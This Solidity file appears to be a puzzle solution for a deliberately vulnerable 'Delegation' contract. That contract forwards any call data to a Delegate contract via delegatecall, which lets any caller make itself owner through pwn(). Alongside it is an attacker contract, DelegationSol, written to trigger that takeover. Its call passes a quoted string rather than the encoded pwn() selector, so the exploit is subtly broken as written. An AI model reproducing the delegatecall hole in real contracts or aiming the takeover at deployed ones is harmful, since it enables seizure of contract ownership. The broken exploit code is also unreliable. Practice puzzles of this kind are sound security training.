// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;

contract DelegationSol{
    constructor(address _victim){
        _victim.call{value:0}('abi.encodeWithSignature("pwn()")');
    }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}